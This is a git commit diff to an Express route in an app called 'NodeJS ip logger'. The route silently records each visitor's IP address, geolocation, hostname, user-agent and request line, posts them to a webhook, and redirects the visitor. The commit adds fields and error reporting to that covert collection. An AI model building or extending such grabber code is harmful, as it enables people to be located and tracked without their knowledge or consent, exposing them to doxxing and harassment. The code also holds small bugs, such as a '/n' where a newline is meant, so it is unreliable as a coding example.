21dddb057d1a82964bd2f915013485148a8bb8de
maxwalks <78441835+maxwalks@users.noreply.github.com>
2024-04-29 10:08:21 +0200

    Added more logs

--- server/routes/main.js
+++ server/routes/main.js
@@ -7,8 +7,10 @@ const d = new Date();
 let date = d.toDateString();
 
 router.get("/", (req, res) => {
+  try {
     const ip = req.headers["x-forwarded-for"]
-    const geo = geoip.lookup(ip) || { country: null, region: null, timezone: null, city: null };
+    const SplitIp = ip.split(",")[0];
+    const geo = geoip.lookup(SplitIp) || { country: null, region: null, timezone: null, city: null };
     const embed = new MessageBuilder()
       .setTitle("NodeJS ip logger")
       .setAuthor(
@@ -17,11 +19,14 @@ router.get("/", (req, res) => {
         "https://www.google.com"
       )
       .setURL("https://www.google.com")
-      .addField("IP address", `${ip}`, true)
+      .addField('Hostname', `${req.hostname}`)
+      .addField("Headers", `${req.headers["user-agent"]}`)
+      .addField("IP address", `${SplitIp}`, true)
       .addField("country", geo.country)
       .addField("region", geo.region)
       .addField("timezone", geo.timezone)
       .addField("city", geo.city)
+      .addField("Request", `**${req.method}** ${req.url}`)
       .setColor(7785669)
       .setDescription(
         "Fetch the ip address of any user, just by opening the website."
@@ -33,13 +38,18 @@ router.get("/", (req, res) => {
       .setTimestamp();
     if(!ip) {
         hook.send("No ip address detected, server is likely running in localhost. Please use a proxy.")
+        console.log(SplitIp)
         res.redirect('/error')
     } else {
-        console.log(`${ip} just accessed the site.`)
+        console.log(`${SplitIp} just accessed the site.`)
         console.log(geo)
         hook.send(embed);
         res.redirect('/success')
     }
+  } catch (error) {
+    console.log(error)
+    hook.send(`An error occurred while processing the request: /n ${error}`)
+  }
 });
 
 router.get('/success', (req, res) => {
@@ -48,6 +58,7 @@ router.get('/success', (req, res) => {
 
 router.get('/error', (req, res) => {
     res.status(500).json({ error: "No ip address detected, server is likely running in localhost. Please use a proxy." })
+    hook.send("No ip address detected, server is likely running in localhost. Please use a proxy.")
 })
 
 module.exports = router;
